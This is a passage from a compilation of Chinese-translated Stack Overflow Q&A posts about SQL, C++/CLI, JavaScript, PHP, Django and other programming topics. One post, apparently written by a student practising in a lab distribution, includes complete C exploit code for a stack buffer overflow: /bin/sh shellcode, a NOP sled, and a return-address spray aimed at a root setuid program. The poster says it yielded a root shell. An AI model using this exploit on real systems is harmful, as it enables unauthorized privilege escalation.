    order by ct.title asc"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:47:33.523

使用此模式计算总行集的子集：

```
sum( case when ColumnToBeTested = trueCondition then 1 else 0 end) as SubCount 
```

# c++-cli - C++ 为字典创建自己的类 asValue

> ID：15998829
> 
> 赞同：0
> 
> 时间：2013-04-14T12:01:54.020
> 
> 标签：c++-cli

我正在使用 VS2010，C++ Windows 窗体应用程序。

这是我的课

```
 #pragma once
    public ref class FrameMatrix
    {
    public:
        FrameMatrix(void);
        FrameMatrix(int IdNm, int ClmnAmnt, int RwsAmnt);
        String^ FMName;
        int FMIdentificationNumber;
        array<array<double>^>^ FMArray;
    }; 
```

现在我尝试将它作为值放入字典中。我得到未解决的令牌。

```
#pragma once
#include "FrameMatrix.h"
    public ref class Form1 : public System::Windows::Forms::Form
    {
    public:
        Dictionary<int, FrameMatrix^>^ ImportedData;
        Form1(void)
        {
            InitializeComponent();
            //
            //TODO: Add the constructor code here
            //
            ImportedData = gcnew Dictionary<int, FrameMatrix^>;
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T20:34:01.403

你忘了括号：

```
ImportedData = gcnew Dictionary<int, FrameMatrix^>();
                                                  ^^ 
```

如果这不能解决错误，请发布您收到的确切错误消息。

# sql - SQL Server 2012 中的自动计算列

> ID：15998830
> 
> 赞同：4
> 
> 时间：2013-04-14T12:02:16.863
> 
> 标签：sql, tsql, sql-server-2012, sql-server-2012-express

SQL Server 2012 本身是否可以自动计算列？

例如：我有三列`START_DATE`，`END_DATE`和`DURATION`。

我想通过这样做来获得持续时间：

```
DURATION = END_DATE - START_DATE 
```

所以我得到了天数的持续时间。

SQL Server 2012 是否可以在创建记录时自动执行此操作？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-14T12:03:40.433

是的，当然 - 只需定义`Duration`为计算列：

```
ALTER TABLE dbo.YourTable
ADD Duration AS DATEDIFF(DAY, START_DATE, END_DATE) PERSISTED 
```

然后你就走了。现在`Duration`将始终显示这两个其他列之间的差异（以天为单位）。`PERSISTED`如果您使用关键字，计算的值将与您的其他列值一起存储。如果两个“相关”列中的任何一个也发生更改，则此列将被更新。

**更新：**如果你想得到日期和今天之间的差异，你可以使用

```
ALTER TABLE dbo.YourTable
ADD Duration AS DATEDIFF(DAY, START_DATE, GETDATE()) 
```

但不幸的是，由于该`GETDATE()`函数是不确定的（毕竟——每次调用它的返回值都会改变），所以不能使用`PERSISTED`关键字。这意味着：每次访问该列（询问其值）时，都会再次进行计算。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-13T13:04:21.923

在您的表设计中，在 Computed Column Specification 下输入任何这些以`(Formula)`获得所需的结果。

**对于日期差异：**

```
CAST(job_end - job_start) AS TIME(0)) 
```

**持续时间：**

```
SUBSTRING(CONVERT(VARCHAR(20),(END_DATE-START_DATE),120),12,8) 
```

同样，您可以计算`Second`, `Minute`, `Hour`, `Month`,`Year`差异。

**使用语法`DATEDIFF`：**

```
DATEDIFF ( datepart , startdate , enddate ) 
```

**供你参考：**

```
DATEDIFF(SECOND, GETDATE(), GETDATE() + 1) AS SecondDifference
DATEDIFF(MINUTE, GETDATE(), GETDATE() + 1) AS MinuteDifference
DATEDIFF(HOUR, GETDATE(), GETDATE() + 1) AS HourDifference
DATEDIFF(DAY, GETDATE(), GETDATE() + 1) AS DayDifference
DATEDIFF(WEEK, GETDATE(), GETDATE() + 1) AS WeekDifference 
```

# mysql - 简单、索引良好的 MySQL 查询大约需要一秒钟

> ID：15998835
> 
> 赞同：2
> 
> 时间：2013-04-14T12:02:44.110
> 
> 标签：mysql, performance

我在我的网络应用程序中使用以下查询。它正在查询一个包含给定时间网上商店价格的结果表。它有大约 100 万条记录。索引是 shopID、StartTime、pID 和 WebsiteID 之一。

查询：

```
SELECT shopID, tresults.StartTime, tresults.Price
FROM tresults
WHERE tresults.pID = 7  
    AND WebsiteID = 1 AND StartTime BETWEEN "2013-4-10" AND "2013-4-11"
    AND tresults.shopID IN (44, 68, 23, 16, 144, 8, 9, 5) 
GROUP BY tresults.StartTime, tresults.Price 
ORDER BY tresults.StartTime, tresults.Price 
```

解释结果：

```
1, SIMPLE, tresults, index_merge, PRIMARY,idxPID,idxWebsite,idxStartTimeASC,idxStartTimeDESC,fk_shopID, idxPID,idxWebsite, 4,4, , 1062, Using intersect(idxPID,idxWebsite); Using where; Using temporary; Using filesort 
```

对我来说看起来不错，但查询仍然需要大约一秒钟才能完成。这在快速网站中是不可接受的。

我怎样才能加快速度？

注意：速度看起来取决于 shopID 的数量

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:18:40.920

您的查询并不像您想象的那么好。它使用“使用临时”和“使用文件排序”。这意味着它已保存在您的文件系统中以供解析器操作并使查询变得更慢。

要尝试改进它，您可以尝试使子句 WHERE 中的字段与您在表中获得的索引相匹配。甚至，如果您的查询将始终使用这些元素运行，则按以下顺序创建一个新索引：pID、websiteID、startTime。

我也不明白为什么您的查询中有两次字段 tresults.pID。

[编辑]

嘿，伙计，你得到临时表是因为你使用聚合函数来操作你的结果集，例如 GROUP BY、ORDER BY、HAVING 等等。只要临时表保存在内存中就可以了，这是访问数据的更快方法。问题是当这些表达到这样的大小时，解析器必须将它们带到文件系统中。

您可以尝试找到最佳平衡更改 tmp_table_size 和 max_heap_table_size 的值。此外，一旦内存存储不支持它们，请尽量避免使用博客/文本列。

您可以在官方文档中找到更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T02:01:43.033

创建以下索引：

```
CREATE INDEX idxTresults_pwsp ON tresults (pId, WebsiteID, StartTime, Price); 
```

这是缩小搜索范围的最佳方法，它还可以防止“使用临时”和“使用文件排序”。

```
mysql> EXPLAIN 
SELECT shopID, tresults.StartTime, tresults.Price
FROM tresults
WHERE tresults.pID = 7  
    AND WebsiteID = 1 AND StartTime BETWEEN '2013-4-10' AND '2013-4-11'
    AND tresults.shopID IN (44, 68, 23, 16, 144, 8, 9, 5) 
GROUP BY tresults.StartTime, tresults.Price 
ORDER BY tresults.StartTime, tresults.Price 
\G
*************************** 1\. row ***************************
           id: 1
  select_type: SIMPLE
        table: tresults
         type: ref
possible_keys: idxpid,idxStarttime,fkShop_id,idxTresults_pwsp
          key: idxTresults_pwsp
      key_len: 9
          ref: const,const
         rows: 1
        Extra: Using where 
```

这样做更好的原因是索引的前两列有助于为特定的 pID 和 WebsiteID 选择正确的行子集。由于您选择了一个特定的 pID 和 WebsiteID，因此这个新索引中的所选条目已经保证按照 StartTime 和 Price 的最佳顺序进行排序，因此查询不需要创建临时表。它只是按照它们存储在索引中的顺序访问条目。

PS：MySQL 不支持“升序”和“降序”索引。它接受关键字，但对它们没有任何不同。因此，您不需要给定列上的两种类型的索引。

PPS：不要对字符串或日期文字使用双引号。使用单引号，以符合 ANSI SQL。如果您曾经使用过其他 RDBMS 品牌，那么养成这个习惯会更好，因为大多数其他品牌根据标准使用引号。MySQL 允许以非标准方式使用双引号。

# php - 印象笔记缩略图

> ID：15998836
> 
> 赞同：1
> 
> 时间：2013-04-14T12:02:49.027
> 
> 标签：php, evernote

我正在编写一个简单的应用程序，通过 Evernote API 列出所有笔记。我已成功验证并检索了 Notes 列表。

现在我正在尝试通过 Evernote API 获取 Note 缩略图。我已经阅读了他们的[此处的文档][1]。我尝试了一个 POST 请求，但由于某种原因它不起作用。显然，我做错了什么。你能给我一个快速，简单的例子吗？

**示例代码：**

```
<form method="post" action="https://www.evernote.com/shard/s226/thm/note/64c08998-0bd3-4964-83fd-73a3baaf53cd.jpg?size=40">
    <input type="submit" value="View Thumbnail">
</form> 
```

我只是将表单方法设置为 POST 并将操作设置为`Note Thumbnail`. 当您自己登录 Evernote 网站时，便笺缩略图会起作用，否则，它只会显示访问被拒绝。我是 Evernote API 的新手，所以我尝试了上面的代码只是为了看看它是否有效。

**正确的示例代码：**

```
<form method="post" action="https://www.evernote.com/shard/s226/thm/note/64c08998-0bd3-4964-83fd-73a3baaf53cd.jpg?size=40">
    <input type="hidden" name="auth" value="{authentication token}">
    <input type="submit" value="View Thumbnail">
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T07:38:27.523

您需要在请求中包含身份验证令牌。

# javascript - 在 Javascript 中创建 Date() 时出错

> ID：15998838
> 
> 赞同：1
> 
> 时间：2013-04-14T12:03:00.377
> 
> 标签：javascript, date

我对**Javascript**完全陌生，我在创建`Date`from 时遇到了麻烦`milliseconds`。

我有这个代码：

```
function (result) {

  alert("Retreived millis = " + result.created);
  //Prints "Retrieved millis = 1362927649000"

  var date = new Date(result.created);
  alert("Created Date = " + date);
  //Prints "Created Date = Invalid Date"

  var current = new Date();
  var currentDate = new Date(current.getTime());
  alert("Current Date = " + currentDate);
  //Prints "Current Date = Sun Apr 14 2013 12:56:51 GMT+0100"
} 
```

最后一个警报证明创建`Date`是有效的，但我不明白为什么第一个`Date`没有正确创建，因为检索到`millis`的是正确的......据我所知，在Javascript中没有数据类型，所以它不能失败，因为检索到`millis`的是 a`string`或 a `long`，对吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:04:50.890

我怀疑`result.created`是一个字符串。由于`Date`构造函数接受字符串但期望它们的格式与此不同，因此它失败了。（例如，`new Date("1362927649000")`导致无效日期，但`new Date(1362927649000)`给我们`Sun Mar 10 2013 15:00:49 GMT+0000 (GMT)`。）

这应该对其进行排序（通过首先转换为数字，因此构造函数知道它正在处理自大纪元以来的毫秒数）：

```
var date = new Date(parseInt(result.created, 10)); 
```

# python - 跨不同文件的相同导入

> ID：15998841
> 
> 赞同：0
> 
> 时间：2013-04-14T12:03:29.507
> 
> 标签：python, google-app-engine

是否可以仅在一个位置包含库/包？

```
class Sample( db.Model ):
  randomText = db.StringProperty( multiline = True ) 
```

--

```
from google.appengine.ext import db
from project.models import Sample
class SampleHandler( ):
  def get( self ):
    xamp = Sample.all( ) 
```

由于处理程序已经从 google.appengine.ext 库/包中导入了 db，然后导入了模型，我假设您不必再次将它包含在模型本身中。但是，看起来我必须这样做，无论如何？

有人愿意解释吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:05:12.077

您需要*在使用它们的地方*导入模块。

如果您的`models`模块使用该`google.appengine.ext.db`模块，则需要将其导入那里，而不是在您的处理程序模块中。

导入事物会在您的模块命名空间中创建对该“事物”的引用，以便那里的代码在使用它时可以找到它。`db`是您可以使用 中定义的对象的本地名称`google.appengine.ext`。

如果您的处理程序使用相同的对象，它仍需要导入该对象。如果通过导入处理程序模块中突然可用的`models` *所有名称*`models`，您最终会遇到名称冲突和难以调试的错误。

反之亦然，如果只`google.appengine.ext.db`在您的处理程序模块中导入而不在您的`models`模块中工作，您需要将给定模块的所有依赖项连同模块本身一起导入。这很快变得不可行，因为您需要记录`models`模块需要的所有内容才能使用它。

# mysql - 在 WHERE 子句中使用列别名

> ID：15998845
> 
> 赞同：1
> 
> 时间：2013-04-14T12:03:57.463
> 
> 标签：mysql, sql, select, subquery, where

A在列列表`WHERE`之前首先被评估。`SELECT`结果如下：

`SELECT l_n AS last_name FROM contacts WHERE last_name > 'J';`

不能工作。
以下将起作用：

`SELECT * FROM (SELECT l_n AS last_name FROM contacts) tmp WHERE last_name > 'J';`

我的问题是：这是否也归类为子查询？如果是的话，如果我想避免使用子查询，还有另一种选择吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T14:43:25.340

对于“这是否也归类为子查询”这个问题，答案是肯定的。对于避免子查询的问题，最简单的方法是在查询的 where 子句中使用实际的列名。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-14T12:09:40.597

是的，这里是...

```
SELECT l_n AS last_name FROM contacts HAVING last_name > 'J'; 
```

请记住，您的查询将带来所有结果（完整扫描），然后根据您的条件过滤 Have 子句。

如果您担心性能，您应该使用子查询。更确切地说：

```
SELECT l_n AS last_name FROM contacts HAVING l_n > 'J'; 
```

[编辑]

嘿，伙计，是的，它没有聚合功能。这是一个例子：

```
mysql> select * from blah;
+----+---------+
| id | name    |
+----+---------+
|  1 | renato  |
|  2 | rodrigo |
+----+---------+
2 rows in set (0.00 sec)

mysql> select id as a1, name as a2 from blah having a1 > 1;
+----+---------+
| a1 | a2      |
+----+---------+
|  2 | rodrigo |
+----+---------+
1 row in set (0.00 sec) 
```

我的数据库是 5.5.29-0ubuntu0.12.04.2。

# php - 如何使用正则表达式从 bbcode [URL] 标签获取属性

> ID：15998847
> 
> 赞同：1
> 
> 时间：2013-04-14T12:04:06.633
> 
> 标签：php, regex

我有一个字符串

```
$string = '[URL="http://www.google.com"]Google[/URL] 
```

我正在使用以下代码将其转换为 html 链接

```
$link = preg_replace('/\[url=(.+?)\](.+?)\[\/url\]/i', '<a href="\1">\2</a>', $string); 
```

它将其转换为以下格式

```
<a href="http://www.google.com">Google</a> 
```

那没问题。但我想验证这两个值`http://www.google.com`，`Google`如何在 Regex 的帮助下分别获取这两个值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:09:56.563

我想你想要的是`preg_match`什么？

实际上，您可以使用已有的模式。它将通过一个参数为您提供整个匹配项以及圆括号内的每个匹配项。

```
preg_match('/\[url=(.+?)\](.+?)\[\/url\]/i', $string, $matches);
echo $matches[1]; // http://www.google.com
echo $matches[2]; // Google
echo $matches[0]; // [URL="http://www.google.com"]Google[/URL] 
```

的返回值为`preg_match`1（找到匹配）或 0/false（无匹配/错误）。

# php - 使用 jQuery 每 10 秒用 php 数据刷新一个 div

> ID：15998853
> 
> 赞同：13
> 
> 时间：2013-04-14T12:04:39.483
> 
> 标签：php, javascript, jquery, html, refresh

我正在尝试使用 jQuery 每 10 秒刷新一次存储在 div 中的数据。

我的 HTML 代码是：

```
<!DOCTYPE html>
<head>
<title>Untitled Document</title>

<script src="http://code.jquery.com/jquery-latest.js"></script>

<script>
    $(document).ready(function(){
        setInterval(function() {
            $("#latestData").load("getLatestData.php #latestData");
        }, 10000);
    });

</script>
</head>

<body>
    <div id = "latestData">

    </div>
</body>
</html> 
```

我正在使用的 PHP 代码（暂时我知道这不会因为相同的“数据”而改变）：

```
<?php

    echo "test";

?> 
```

但是，它甚至没有在 html 页面上显示“测试”.. 谁能建议我哪里出错了？

非常感谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-14T12:08:30.563

jQuery`load`方法以不同的方式工作。尝试阅读它的[文档](http://api.jquery.com/load/)。

您不必指定目标元素 ID 两次，删除第二个，如下所示：

```
$("#latestData").load("getLatestData.php"); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-14T12:09:55.137

`$.get`这是一种使用jQuery中的方法来解决您想要实现的目标的方法：

```
$(document).ready(function () {
    setInterval(function() {
        $.get("getLatestData.php", function (result) {
            $('#latestData').html(result);
        });
    }, 10000);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-09-10T07:31:32.077

如果要刷新消息计数，只需使用以下代码：

```
$(document).ready(function () {
    setInterval(function () {
        $("#ID").load();
    }, 1000);
}); 
```

# c - 缓冲区溢出 esp 偏移量

> ID：15998860
> 
> 赞同：1
> 
> 时间：2013-04-14T12:05:40.360
> 
> 标签：c, stack, buffer-overflow

我是一名计算机工程专业的学生，​​正在研究堆栈缓冲区溢出的工作原理。我正在阅读的书是 Jon Erickson 的 The Art of Exploitation（第 1 版）。为了练习我正在学习的内容，我在虚拟机中安装了 Damn Vulnerable Linux 发行版。我禁用了 ASRL (kernel.randomize_va_space = 0)，我用**GCC 3.4.6**编译了以下代码，我正在使用**GDB 6.6**并且发行版的内核是**2.6.20**。我的电脑有一个英特尔处理器。易受攻击的程序 (test2) 由 root 创建并设置为 setuid。

易受攻击的代码如下：

```
//test2.c
int main(int argc, char *argv[])
{
char buffer[500];

strcpy(buffer, argv[1]);

return 0;
} 
```

而由普通（非root）用户创建的利用代码如下：

```
//main.c
#include <stdlib.h>

char shellcode[] =
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned long sp(void)
{
__asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{
int i, offset;
long esp, ret, *addr_ptr;
char *buffer2, *ptr;

offset = 0;
esp = sp();

ret = esp - offset;

printf("Stack pointer (ESP) : 0x%x\n", esp);
printf(" Offset from ESP : 0x%x\n", offset);
printf("Desired Return Addr : 0x%x\n", ret);

buffer2 = malloc(600);

ptr = buffer2;
addr_ptr = (long *)ptr;
for (i = 0; i < 600; i += 4)
{
*(addr_ptr++) = ret;
}

for (i = 0; i < 200; i++)
{
buffer2[i] = '\x90';
}

ptr = buffer2 + 200;
for (i = 0; i < strlen(shellcode); i++)
{
*(ptr++) = shellcode[i];
}

buffer2[600 - 1] = 0;
execl("/root/workspace/test2/Release/test2", "test2", buffer2, 0);

free(buffer2);

return 0;
} 
```

该程序有效，它利用了 test2 中的缓冲区溢出漏洞并给了我一个 root shell。我不明白的是，即使在多次阅读这本书并试图在互联网上找到答案之后，为什么我们存储在变量**esp**中的堆栈指针的值是我们的 shellcode 的返回地址。我已经用 GDB 反汇编了程序，一切都按作者所说的那样工作，但我不明白为什么会发生这种情况。

我本来想向您展示反汇编程序的外观以及执行期间内存的外观，但是我无法从虚拟机上的来宾计算机复制/粘贴，也不允许在我的问题中插入图像。所以我只能尝试描述在程序 main （在 test2 中利用 BOF）执行期间发生的情况：

反汇编main，我看到堆栈上分配了28个字节（7个变量* 4个字节）。然后调用函数 sp() 并将堆栈指针的值存储在**esp**中。存储在变量 esp 中的值是**0xbffff344**。然后，如您所见，我们有一些 printf，我们将有效负载存储在 buffer2 中，然后我们调用 execl 函数，将 buffer2 作为参数传递。

现在 root shell 出现了，然后程序退出了。设置不同的偏移量后反汇编程序，我可以清楚地看到**0xbffff344**正是test2执行时存储有效载荷的地址。你能解释一下这是怎么发生的吗？execl 是否为 test2 程序设置了新的堆栈帧？在 main.c 中，只有 28 个字节分配在堆栈上，而在 test2 中，500 个字节分配在堆栈上（用于 buffer2）。那么我怎么知道我在 main.c 中得到的堆栈指针正是 shellcode 的返回地址呢？

如果我写了一些愚蠢的东西，我感谢你并道歉。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-15T09:50:55.297

**你能解释一下这是怎么发生的吗？**

当 ASLR 被禁用时，每个可执行文件都从相同的地址开始，因此给定堆栈指针，您可以猜测所需的偏移量以在 test2 中找到您的缓冲区位置。这也是 NOP 雪橇变得有用的地方，因为如果偏移量不是到 shellcode 的确切位移，它会给你多个可能的命中。

话虽如此，漏洞利用程序主函数中 ESP 的值是 test2 中已执行缓冲区的位置这一事实似乎不正确。您确定您只是没有误解 gdb 结果吗？

您应该能够使用以下方法计算缓冲区的偏移量：esp - 500 + 28。

请注意，使用此类公式时应始终戴上手套：编译器如何处理本地变量（大小、顺序等）可能会有所不同。

**那么我怎么知道我在 main.c 中得到的堆栈指针正是 shellcode 的返回地址呢？**

好吧，你没有。这取决于机器，程序的编译方式等。

**execl 是否为 test2 程序设置了新的堆栈帧？**

从 execve 手册页：

> exec 系列函数应该用新的过程映像替换当前的过程映像。新映像应由称为新进程映像文件的常规可执行文件构成。成功的 exec 不会有任何返回，因为调用进程映像被新进程映像覆盖。

堆栈被 test2 的新堆栈覆盖。

希望能帮助到你 ：）

# ruby-on-rails-3 - 将 3 wicked_pdf 图像从 html 转换为 pdf

> ID：15998872
> 
> 赞同：0
> 
> 时间：2013-04-14T12:07:05.007
> 
> 标签：ruby-on-rails-3, image, wicked-pdf

我遇到了在 pdf 和 html 中显示图像的问题。

基本上我想要的是让我的 html 视图可以以 pdf 格式下载。所以我创建了一个 partial `_pdf_view.html.haml`，它看起来（现在）像这样：

```
%p
  = wicked_pdf_image_tag "vehicles/Toyota_Echo1-1.jpg" 
```

然后我只是在 in`download.html.haml`和 in 中渲染这个部分`download.pdf.haml`。这个想法是 html 文件预览将要下载为 pdf 的内容。

有趣的是，这段代码会将图像很好地放在我的 pdf 中，但不会放在我的 html 中。在 PDF 中，需要指定完整的文件路径，但是，在 html 中不会飞。如果我改变路径，`"/vehicles/Toyota_Echo1-1.jpg"`那么它就是相反的方式......

除了为图像创建单独的文件或单独的代码块之外，还有什么办法吗？

PS我正在使用：rails 3.2.12，wkhtmltopdf 0.9.9，wicked_pdf 0.9.5

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T22:24:21.060

更改基于 :format 创建的图像标签。

```
- if params[:format] == 'pdf'
  = wicked_pdf_image_tag 'vehicles/Toyota_Echo1-1.jpg'
- else
  = image_tag 'vehicles/Toyota_Echo1-1.jpg' 
```

# java - 显示来自 ArrayList 的数据 (EJB + Servlet + JSP(JSTL))

> ID：15998873
> 
> 赞同：0
> 
> 时间：2013-04-14T12:07:15.400
> 
> 标签：java, css, jsp, servlets, ejb

我有一个无状态的 Session Bean，我在其中从数据库中获取值并将它们写在 Arraylist 中，然后返回给 servlet。在一个 servlet 中，我在 JSP 页面上发送 ArrayList 并尝试显示该值，但只显示“dataList”行，我的错误是什么？

这是我的代码：

ViewBean.java

```
//imports
@Stateless
@LocalBean
public class ViewBean {
    public List getData() {
        ResultSet rs = null;
        List list = null;
        try {
        Class.forName("com.mysql.jdbc.Driver").newInstance();
        Connection con =              DriverManager.getConnection("jdbc:mysql://localhost:3306/c_store", "root", "root");
        Statement stmt = con.createStatement();
        String query = "SELECT product.name_prod, product.price_prod, buy.number_buy, client.name_client, client.date_client FROM product, buy, client WHERE product.id_prod = buy.id_buy = client.id_client;";
        stmt.executeQuery(query);
        rs = stmt.getResultSet();
        list = new ArrayList();

        while(rs.next()){
            list.add(rs.getString(1));
            list.add(rs.getInt(2));
            list.add(rs.getInt(3));
            list.add(rs.getString(4));
            list.add(rs.getString(5));
        }
        rs.close();
        stmt.close();
        con.close();
    } catch (InstantiationException e) {
        e.printStackTrace();
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    } catch (ClassNotFoundException e) {
        e.printStackTrace();
    } catch (SQLException e) {
        e.printStackTrace();
    }
    return list;
}

} 
```

ViewServlet.java

```
//imports
@WebServlet("/ViewServlet")
public class ViewServlet extends HttpServlet {
private static final long serialVersionUID = 1L;

@EJB
ViewBean viewBean;

protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    PrintWriter out = response.getWriter();
    List data = new ArrayList();
    data = viewBean.getData();
    request.setAttribute("dataList", data);

    for(int i = 0; i<data.size(); i++){
        out.println(data.get(i));
    }
}
   } 
```

视图.jsp

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
pageEncoding="ISO-8859-1"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ page import="java.util.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"     "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>View Records</title>
</head>
<body>
<c:forEach var="item" items="dataList">
    <b><c:out value="${item}" /></b>
</c:forEach>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T14:13:12.863

你忘了声明`dataList`为变量，看看`items`循环中的属性：

```
<c:forEach var="item" items="${dataList}">
                             ^ here is the bug, add the dollar sign and the curly braces
    <b><c:out value="${item}" /></b>
</c:forEach> 
```

# java - 带有 JPA 的 ObjectDB

> ID：15998876
> 
> 赞同：1
> 
> 时间：2013-04-14T12:07:48.623
> 
> 标签：java, object, jpa, objectdb

我正在尝试使用 JPA 创建一个 objectdb。下面的代码是我所做的，但不确定我是否做得正确。实体是学生，属性是名字，姓氏等。有人知道我是否将其设置为正确的，是否错误？

```
package Student;
 import java.io.Serializable;
import java.sql.Date;

import javax.persistence.*;

@Entity
    public class students implements Serializable {
    private static final long serialVersionUID = 1L;

    @studentid @GeneratedValue
    private long id;
  } 

    public class studentdetails {
    int studentid;
    String firstname;
    String surname;
    char gender;
    Date dob;
    String address1;
    String address2;
    String address3;
    char postcode;
    int phonenumber;
    int courseid;

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T13:54:29.263

studentdetails 类不能用于使用 JPA 持久化数据，因为它没有被定义为可持久化类型（实体、可嵌入），甚至不是可序列化的。

学生和学生详细信息之间也没有联系。

# python - 为什么刚启动 Django 开发服务器失败并显示“关键字必须是字符串”？

> ID：15998882
> 
> 赞同：0
> 
> 时间：2013-04-14T12:08:24.137
> 
> 标签：python, django

我开始学习 Django 并且一直在关注 Django 网站上的在线教程。

一切正常，我有一个名为 mysite 的文件夹，然后是名为 mysite/ 和 manage.py 的子文件夹，就像教程中所说的那样：[https ://docs.djangoproject.com/en/1.5/intro/tutorial01/#creating-一个专案](https://docs.djangoproject.com/en/1.5/intro/tutorial01/#creating-a-project)

但是，当我运行命令时

```
$ python manage.py runserver 
```

我明白了：

```
Validating models...

Unhandled exception in thread started by <bound method Command.inner_run of <django.contrib.staticfiles.management.commands.runserver.Command object at 0x10165aed0>>
Traceback (most recent call last):
File "/Library/Python/2.6/site-packages/django/core/management/commands/runserver.py", line 92, in inner_run
self.validate(display_num_errors=True)
File "/Library/Python/2.6/site-packages/django/core/management/base.py", line 280, in validate
num_errors = get_validation_errors(s, app)
File "/Library/Python/2.6/site-packages/django/core/management/validation.py", line 35, in get_validation_errors
for (app_name, error) in get_app_errors().items():
File "/Library/Python/2.6/site-packages/django/db/models/loading.py", line 166, in get_app_errors
self._populate()
File "/Library/Python/2.6/site-packages/django/db/models/loading.py", line 72, in _populate
self.load_app(app_name, True)
File "/Library/Python/2.6/site-packages/django/db/models/loading.py", line 96, in load_app
models = import_module('.models', app_name)
File "/Library/Python/2.6/site-packages/django/utils/importlib.py", line 35, in import_module
__import__(name)
File "/Library/Python/2.6/site-packages/django/contrib/auth/models.py", line 21, in <module>
from django.contrib.contenttypes.models import ContentType
File "/Library/Python/2.6/site-packages/django/contrib/contenttypes/models.py", line 127, in <module>
class ContentType(models.Model):
File "/Library/Python/2.6/site-packages/django/db/models/base.py", line 97, in __new__
new_class.add_to_class('_meta', Options(meta, **kwargs))
TypeError: Error when calling the metaclass bases
__init__() keywords must be strings 
```

根据教程，它应该这样说：

```
Validating models...

0 errors found
April 14, 2013 - 15:50:53
Django version 1.5, using settings 'mysite.settings'
Development server is running at http://127.0.0.1:8000/
Quit the server with CONTROL-C. 
```

我试图`http://127.0.0.1:8000/`在我的网络浏览器中访问，但我只是得到错误无法连接。

有谁知道我哪里出错了或者我需要做什么来纠正这个问题？

我正在使用 Django 1.5 和 Python 2.6.1。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T12:21:26.860

根据[Django 文档](https://docs.djangoproject.com/en/dev/intro/install/#install-python)：

> Django 1.5 适用于从 2.6.5 到 2.7 的任何 Python 版本。

根据[这张票](https://code.djangoproject.com/ticket/18961)，我建议你升级你的 Python 版本。或者，如果你不能升级它，你还有另一种方法，它在票的[最后一条评论中给出：](https://code.djangoproject.com/ticket/18961#comment:6)

> 使用支持 Python 2.5+ 的 Django 1.4

# c# - 创建 WMPLib.IWMPFolderMonitorServices 对象

> ID：15998887
> 
> 赞同：0
> 
> 时间：2013-04-14T12:08:51.980
> 
> 标签：c#, wmplib

我尝试`WMPLib.IWMPFolderMonitorServices`在 C# 中创建一个对象来管理包含音乐的文件夹。MSDN 说

> “通过 IWMPPlayer 调用 QueryInterface 检索指向 IWMPFolderMonitorServices 的指针。通过调用 COM CoCreateInstance 方法检索指向 IWMPPlayer 接口的指针。”

但我不知道该怎么做。请指导我。非常感谢

# ruby-on-rails - Ruby 协会：有一对多 - 有可能吗？

> ID：15998890
> 
> 赞同：0
> 
> 时间：2013-04-14T12:09:06.983
> 
> 标签：ruby-on-rails, ruby, activerecord, associations

我想有一种奇怪的联想。可以说我有以下课程：

```
class Kid < ActiveRecord::Base
    belongs_to :parent
    has_one :friend
end

class Friend < ActiveRecord::Base
    belongs_to :kid
end

class Parent < ActiveRecord::Base
    has_many :kids
    has_one :friend, :through => :kid #This is the "problematic line"
end 
```

我知道最后一个关系（`has_one :friend`）是不可能的并且没有意义。但是可以说我知道第一个孩子的朋友总是有足够的信息用于我的父母实例，所以我想像'parent.friend'一样得到它而不是`parent.kids.first.friend`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:43:09.250

不，这没有任何意义。如果父母有很多孩子，那么他们不能只有一个朋友，他们的朋友会和有孩子一样多。

Parent.friend 没有任何意义 - 哪个孩子的朋友？

如果它总是第一个，请创建一个函数：

```
def first_friend
  kids.first.friend
end 
```

如果你想要朋友列表...

```
def friends
  kids.map(&:friend)  # note this queries immediately, it is not a named scope
end 
```

如果您想从另一个方向获取父母的朋友列表，请在 Friend 模型中使用命名范围：

```
named_scope :for_parent, lambda {|p| joins(:kids).where('kids.parent_id = ?', p)} 
```

# jquery - blockui 直到没有完成下载文件

> ID：15998891
> 
> 赞同：2
> 
> 时间：2013-04-14T12:09:10.947
> 
> 标签：jquery, asp.net, download, blockui

我正在单击按钮创建一个文件并将其发送给用户以下载它。

我正在使用 jQuery blockUi 在执行时显示一条消息。

我想取消blockUi直到下载执行

我怎样才能做到这一点？

我创建文件并在创建文件末尾使用处理程序发送给用户我写了一个cookie并在jquery中检查cookie，如果cookie不为null，则unblockUi：

```
<script type="text/javascript">
    var fileDownloadCheckTimer;
    function blockUIForDownload() {
